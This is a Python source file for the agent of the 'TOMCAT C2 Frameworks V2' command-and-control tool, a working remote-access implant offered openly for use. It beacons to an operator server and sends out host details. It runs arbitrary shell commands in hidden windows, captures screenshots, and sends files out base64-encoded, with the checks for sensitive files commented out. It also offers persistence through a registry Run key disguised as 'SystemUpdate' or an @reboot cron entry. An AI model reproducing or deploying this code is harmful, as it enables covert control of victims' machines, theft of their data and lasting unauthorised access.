#!/usr/bin/python
# TOMCAT C2 Frameworks V2
# Author: TOM7
# GitHub: tom7voldemort
# Release: January 16th, 2026

"""
[+] NOTE:
    -- Copying without owner permission is illegal.
    -- If you want to expand this project, ask owner for collaboration instead.

    Thanks for understanding.
    ~TOM7
"""

import base64
import getpass
import json
import os
import platform
import socket
import subprocess
import sys
from time import sleep

if platform.system() == "Windows":
    try:
        import winreg
    except ImportError:
        winreg = None
else:
    winreg = None

XBanner = """
___________________      _____  _________     ________________ __________ __________________________  ______________________
\\__    ___/\\_____  \\    /     \\ \\_   ___ \\   /  _  \\__    ___/ \\______   \\\\_____  \\__    ___/\\      \\ \\_   _____/\\__    ___/
  |    |    /   |   \\  /  \\ /  \\/    \\  \\/  /  /_\\  \\|    |     |    |  _/ /   |   \\|    |   /   |   \\ |    __)_   |    |   
  |    |   /    |    \\/    Y    \\     \\____/    |    \\    |     |    |   \\/    |    \\    |  /    |    \\|        \\  |    |   
  |____|   \\_______  /\\____|__  /\\______  /\\____|__  /____|     |______  /\\_______  /____|  \\____|__  /_______  /  |____|   
                   \\/         \\/        \\/         \\/                  \\/         \\/                \\/        \\/            

                                                                      
                                            <   TOMCAT C2 Frameworks V2 Agent   />

"""


class TOMCATC2AGENT:
    def __init__(
        self,
        ServerHost,
        ServerPort,
        UseMTLS=False,
        ClientKeyPath=None,
        ClientCertPath=None,
        CACertPath=None,
    ):
        self.ServerHost = ServerHost
        self.ServerPort = ServerPort
        self.UseMTLS = UseMTLS
        self.Socket = None
        self.SSLSocket = None
        self.Key = None
        self.Running = True
        self.ClientKeyPath = ClientKeyPath or "agent-key.pem"
        self.ClientCertPath = ClientCertPath or "agent-cert.pem"
        self.CACertPath = CACertPath or "ca-cert.pem"

    def GetLocalIP(self):
        try:
            S = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            S.connect(("8.8.8.8", 80))
            LocalIP = S.getsockname()[0]
            S.close()
            return LocalIP
        except Exception:
            return "N/A"

    def SetupSSLContext(self):
        try:
            import ssl

            if not os.path.exists(self.ClientKeyPath):
                print(f"[!] Client key not found: {self.ClientKeyPath}")
                return False
            if not os.path.exists(self.ClientCertPath):
                print(f"[!] Client cert not found: {self.ClientCertPath}")
                return False
            if not os.path.exists(self.CACertPath):
                print(f"[!] CA cert not found: {self.CACertPath}")
                return False
            SSLContext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            SSLContext.load_cert_chain(
                certfile=self.ClientCertPath, keyfile=self.ClientKeyPath
            )
            SSLContext.load_verify_locations(cafile=self.CACertPath)
            SSLContext.verify_mode = ssl.CERT_REQUIRED
            SSLContext.check_hostname = False
            try:
                SSLContext.set_ciphers("HIGH:!aNULL:!MD5:!DSS")
            except Exception:
                pass
            try:
                SSLContext.minimum_version = ssl.TLSVersion.TLSv1_2
            except AttributeError:
                pass
            print("[+] MTLS Context Initialized")
            return SSLContext
        except Exception as e:
            print(f"[!] MTLS Setup Error: {e}")
            return None

    def Connect(self):
        MaxRetries = 1000000
        RetryDelay = 5
        print(f"[*] Connecting To {self.ServerHost}:{self.ServerPort}")
        if self.UseMTLS:
            print("[*] MTLS Mode: Enabled")
        else:
            print("[*] MTLS Mode: Disabled")
        for Attempt in range(MaxRetries):
            try:
                self.Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.Socket.settimeout(10)
                if self.UseMTLS:
                    import ssl

                    SSLContext = self.SetupSSLContext()
                    if not SSLContext:
                        print("[!] Failed to setup MTLS context")
                        return False
                    print("[*] Establishing TCP connection...")
                    self.Socket.connect((self.ServerHost, self.ServerPort))
                    print("[*] Starting SSL/TLS handshake...")
                    self.SSLSocket = SSLContext.wrap_socket(
                        self.Socket, server_hostname=None, do_handshake_on_connect=True
                    )
                    print("[*] Verifying server certificate...")
                    ServerCert = self.SSLSocket.getpeercert()
                    if not ServerCert:
                        print("[!] No server certificate received")
                        self.SSLSocket.close()
                        return False
                    Subject = dict(x[0] for x in ServerCert["subject"])
                    CN = Subject.get("commonName", "Unknown")
                    print(f"[+] Server Certificate Verified - CN: {CN}")
                    self.Socket = self.SSLSocket
                else:
                    self.Socket.connect((self.ServerHost, self.ServerPort))
                print(f"[+] Connected! Attempt {Attempt + 1}")
                return True
            except ssl.SSLError as e:
                print(f"[-] SSL Error: {e}")
                if "certificate verify failed" in str(e).lower():
                    print("[!] Server certificate verification failed!")
                    print("[!] Ensure certificates are from the same CA")
                elif "handshake" in str(e).lower():
                    print("[!] SSL handshake failed")
                    print("[!] Check if server is running with MTLS enabled")
                try:
                    self.Socket.close()
                except Exception:
                    pass
                if Attempt < MaxRetries - 1:
                    sleep(RetryDelay)
                else:
                    return False
            except socket.timeout:
                print(f"[-] Connection timeout. Attempt {Attempt + 1}/{MaxRetries}")
                try:
                    self.Socket.close()
                except Exception:
                    pass
                if Attempt < MaxRetries - 1:
                    sleep(RetryDelay)
                else:
                    return False
            except Exception as e:
                print(f"[-] Connection Failed. Attempt {Attempt + 1}/{MaxRetries}: {e}")
                try:
                    self.Socket.close()
                except Exception:
                    pass
                if Attempt < MaxRetries - 1:
                    sleep(RetryDelay)
                else:
                    return False

    def XorCryptography(self, Data, Key):
        Result = bytearray()
        KeyBytes = Key if isinstance(Key, bytes) else Key.encode()
        DataBytes = Data if isinstance(Data, bytes) else Data.encode()
        for i, Byte in enumerate(DataBytes):
            Result.append(Byte ^ KeyBytes[i % len(KeyBytes)])
        return bytes(Result)

    def Handshake(self):
        try:
            print("[*] Performing Handshake")
            self.Socket.settimeout(10)
            Key = self.Socket.recv(1024)
            if not Key:
                print("[-] No Key Received")
                return False
            self.Key = Key
            print(f"[+] Encryption Key Received ({len(Key)} bytes)")
            Info = {
                "OS": platform.system(),
                "Hostname": platform.node(),
                "User": getpass.getuser(),
                "Platform": platform.platform(),
                "Architecture": platform.machine(),
                "PythonVersion": platform.python_version(),
                "AgentIP": self.GetLocalIP(),
                "MTLSEnabled": self.UseMTLS,
            }
            InfoJson = json.dumps(Info)
            self.Socket.send(InfoJson.encode())
            print(f"[+] System Info Sent: {platform.node()}")
            sleep(0.5)
            return True
        except Exception as e:
            print(f"[-] Handshake Failed: {e}")
            return False

    def Encrypt(self, Data):
        try:
            from cryptography.fernet import Fernet

            Cipher = Fernet(self.Key)
            return Cipher.encrypt(Data.encode() if isinstance(Data, str) else Data)
        except ImportError:
            return self.XorCryptography(Data, self.Key)
        except Exception:
            return self.XorCryptography(Data, self.Key)

    def Decrypt(self, Data):
        try:
            from cryptography.fernet import Fernet

            Cipher = Fernet(self.Key)
            return Cipher.decrypt(Data).decode()
        except ImportError:
            return self.XorCryptography(Data, self.Key).decode()
        except Exception:
            return self.XorCryptography(Data, self.Key).decode()

    def ExecCommand(self, Command):
        try:
            if Command == "SCREENSHOT":
                return self.TakeScreenshot()
            elif Command == "ELEVATE":
                return self.CheckPrivileges()
            elif Command.startswith("DOWNLOAD:"):
                Filepath = Command.split(":", 1)[1].strip()
                return self.ReadFiles(Filepath)
            elif Command.startswith("UPLOAD:"):
                Data = Command.split(":", 1)[1]
                return self.WriteFiles(Data)
            elif Command == "SYSINFO":
                return self.GetSystemInfo()
            elif Command.lower() in ["exit", "quit", "disconnect"]:
                self.Running = False
                return "Agent Disconnecting..."
            print(f"[*] Executing: {Command}")
            if platform.system() == "Windows":
                Startupinfo = None
                if hasattr(subprocess, "STARTUPINFO"):
                    Startupinfo = subprocess.STARTUPINFO()
                    Startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                    Startupinfo.wShowWindow = 0
                Result = subprocess.run(
                    Command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=60,
                    startupinfo=Startupinfo,
                )
            else:
                Result = subprocess.run(
                    Command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=60,
                    executable="/bin/bash",
                )
            Output = Result.stdout + Result.stderr
            return Output if Output else "Command Executed Successfully (No Output)"
        except subprocess.TimeoutExpired:
            return "ERROR: Command Timeout (60s)"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def TakeScreenshot(self):
        try:
            if platform.system() == "Windows":
                try:
                    from io import BytesIO
                    from PIL import ImageGrab

                    Screenshot = ImageGrab.grab()
                    Buffer = BytesIO()
                    Screenshot.save(Buffer, format="PNG")
                    ImgData = base64.b64encode(Buffer.getvalue()).decode()
                    return f"SCREENSHOT DATA:{ImgData}"
                except ImportError:
                    pass
                PsScript = """
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
                $ms = New-Object System.IO.MemoryStream
                $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
                [Convert]::ToBase64String($ms.ToArray())
                """
                Result = subprocess.run(
                    ["powershell", "-Command", PsScript],
                    capture_output=True,
                    text=True,
                    timeout=10,
                )
                if Result.returncode == 0 and Result.stdout.strip():
                    return f"SCREENSHOT DATA:{Result.stdout.strip()}"
                else:
                    return (
                        "ERROR: Screenshot Failed (Install Pillow For Better Support)"
                    )
            elif platform.system() == "Linux":
                Result = subprocess.run(
                    "scrot -o /tmp/screenshot.png && base64 /tmp/screenshot.png && rm /tmp/screenshot.png",
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=10,
                )
                if Result.returncode == 0:
                    return f"SCREENSHOT DATA:\n {Result.stdout.strip()}"
                else:
                    return "ERROR: Screenshot Tools Not Available (Install Scrot)"
            else:
                return "ERROR: Screenshot Not Supported On This Platform"
        except Exception as e:
            return f"ERROR: Screenshot Failed: {str(e)}"

    def CheckPrivileges(self):
        try:
            CurrentUser = getpass.getuser()
            IsAdmin = False
            if platform.system() == "Windows":
                try:
                    import ctypes

                    IsAdmin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                except Exception:
                    try:
                        TestFiles = os.path.join(
                            os.environ.get("SystemRoot", "C:\\Windows"), "test.tmp"
                        )
                        with open(TestFiles, "w") as F:
                            F.write("test")
                        os.remove(TestFiles)
                        IsAdmin = True
                    except Exception:
                        IsAdmin = False
            else:
                IsAdmin = os.getuid() == 0 if hasattr(os, "getuid") else False
            Status = "Administrator/Root" if IsAdmin else "Standard User"
            Info = []
            Info.append("PRIVILEGE CHECK")
            Info.append(f"Current User: {CurrentUser}")
            Info.append(f"Privilege Level: {Status}")
            Info.append(f"OS: {platform.system()}")
            if platform.system() == "Windows":
                Info.append(f"Domain: {os.environ.get('USERDOMAIN', 'N/A')}")
            return "\n".join(Info)
        except Exception as e:
            return f"ERROR: {str(e)}"

    def ReadFiles(self, Filepath):
        try:
            print(f"[*] Reading File: {Filepath}")
            """
            Dangerous = ["/etc/shadow", "/etc/passwd", "SAM", "SYSTEM", "win.ini"]
            if any(D in Filepath for D in Dangerous):
                return "ERROR: Access Denied - Sensitive System File"
            """

            with open(Filepath, "rb") as F:
                Content = F.read()
            if len(Content) > 10 * 1024 * 1024:
                return "ERROR: File Too Large (>10MB)"
            Encoded = base64.b64encode(Content).decode()
            return f"FILE DATA:{Encoded}"
        except FileNotFoundError:
            return f"ERROR: File Not Found: {Filepath}"
        except PermissionError:
            return f"ERROR: Permission Denied: {Filepath}"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def WriteFiles(self, Data):
        try:
            Filename, EncodedContent = Data.split("|", 1)
            """
            Dangerous = ["/etc/", "/bin/", "/sbin/", "C:\\Windows", "C:\\Program Files"]
            if any(D in Filename for D in Dangerous):
                return "ERROR: Access Denied - Sensitive Location"
            """
            Content = base64.b64decode(EncodedContent)
            if platform.system() == "Windows":
                DownloadDir = os.path.join(
                    os.environ.get("USERPROFILE", "C:\\"), "Downloads"
                )
            else:
                DownloadDir = os.path.join(os.path.expanduser("~"), "Downloads")
            os.makedirs(DownloadDir, exist_ok=True)
            Filepath = os.path.join(DownloadDir, os.path.basename(Filename))
            with open(Filepath, "wb") as F:
                F.write(Content)
            return f"File Uploaded Successfully!\nPath: {Filepath}\nSize: {len(Content)} Bytes"
        except Exception as e:
            return f"ERROR: Upload Failed: {str(e)}"

    def GetSystemInfo(self):
        Info = []
        Info.append("SYSTEM INFORMATION")
        Info.append(f"OS: {platform.system()} {platform.release()}")
        Info.append(f"Platform: {platform.platform()}")
        Info.append(f"Architecture: {platform.machine()}")
        Info.append(f"Processor: {platform.processor()}")
        Info.append(f"Hostname: {platform.node()}")
        Info.append(f"Username: {getpass.getuser()}")
        Info.append(f"Python: {platform.python_version()}")
        Info.append(f"AgentIP: {self.GetLocalIP()}")
        Info.append(f"Current Dir: {os.getcwd()}")
        Info.append(f"MTLS: {'Enabled' if self.UseMTLS else 'Disabled'}")
        if platform.system() == "Windows":
            Info.append(f"Computer: {os.environ.get('COMPUTERNAME', 'N/A')}")
            Info.append(f"Domain: {os.environ.get('USERDOMAIN', 'N/A')}")
        return "\n".join(Info)

    def Run(self):
        print("TOMCAT C2 AGENT" + (" (MTLS)" if self.UseMTLS else ""))
        if not self.Connect():
            print("[-] Failed To Connect. Exiting.")
            sys.exit(1)
        if not self.Handshake():
            print("[-] Handshake Failed. Exiting.")
            sys.exit(1)
        print("[+] Agent Is Now Operational!")
        print("[*] Waiting For Commands...\n")
        while self.Running:
            try:
                self.Socket.settimeout(None)
                EncryptedCmd = b""
                ChunkSize = 4096
                print("[*] Waiting For Command...")
                while True:
                    try:
                        Chunk = self.Socket.recv(ChunkSize)
                        if not Chunk:
                            print("[-] Connection Closed By Server")
                            self.Running = False
                            break
                        EncryptedCmd += Chunk
                        try:
                            Command = self.Decrypt(EncryptedCmd)
                            print(f"[+] Command Received: {Command[:50]}...")
                            break
                        except Exception:
                            if len(EncryptedCmd) > 1048576:
                                raise Exception("Command Too Large")
                            continue
                    except socket.timeout:
                        if EncryptedCmd:
                            break
                        continue
                if not self.Running:
                    break
                Output = self.ExecCommand(Command)
                print("[+] Command Executed")
                if len(Output) > 1000000:
                    Output = Output[:1000000] + "\n...[OUTPUT TRUNCATED - TOO LARGE]"
                EncryptedOutput = self.Encrypt(Output)
                self.Socket.sendall(EncryptedOutput + b"<END>")
                print(f"[+] Response Sent ({len(EncryptedOutput)} Bytes)\n")
            except KeyboardInterrupt:
                print("\n[!] Keyboard Interrupt Received")
                break
            except ConnectionResetError:
                print("[-] Connection Reset By Server")
                break
            except BrokenPipeError:
                print("[-] Broken Pipe")
                break
            except OSError as e:
                print(f"[-] Socket Error: {e}")
                break
            except Exception as e:
                print(f"[-] Error In Main Loop: {e}")

                try:
                    ErrorMsg = f"ERROR: Agent Error: {str(e)}"
                    Encrypted = self.Encrypt(ErrorMsg)
                    self.Socket.sendall(Encrypted + b"<END>")
                except Exception:
                    print("[-] Failed To Send Error Message")
                    break
        print("\n[*] Agent Shutting Down...")
        try:
            self.Socket.close()
        except Exception:
            pass


def HideConsoleWindow():
    if platform.system() == "Windows":
        try:
            import ctypes

            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 0
            )
        except Exception:
            pass


def AddAgentPersistence():
    try:
        if platform.system() == "Windows" and winreg:
            ScriptPath = os.path.abspath(sys.argv[0])
            Key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE,
            )
            winreg.SetValueEx(
                Key, "SystemUpdate", 0, winreg.REG_SZ, f'pythonw "{ScriptPath}"'
            )
            winreg.CloseKey(Key)
            print("[+] Persistence Added (Registry)")
        elif platform.system() == "Linux":
            ScriptPath = os.path.abspath(sys.argv[0])
            Cron = f"@reboot python3 {ScriptPath} &\n"
            os.system(f'(crontab -l 2>/dev/null; echo "{Cron}") | crontab -')
            print("[+] Persistence Added (Cron)")
    except Exception as e:
        print(f"[-] Persistence Failed: {e}")


if __name__ == "__main__":
    print(XBanner)
    ServerHost = "0.0.0.0"
    ServerPort = 4444
    MTLSMode = True  # Set True to enable MTLS
    ClientKeyPath = "agent-key.pem"
    ClientCertPath = "agent-cert.pem"
    CACertPath = "ca-cert.pem"
    HideConsole = False
    AddPersistence = False
    if HideConsole:
        HideConsoleWindow()
    if AddPersistence:
        AddAgentPersistence()
    Agent = TOMCATC2AGENT(
        ServerHost,
        ServerPort,
        UseMTLS=MTLSMode,
        ClientKeyPath=ClientKeyPath,
        ClientCertPath=ClientCertPath,
        CACertPath=CACertPath,
    )
    Agent.Run()
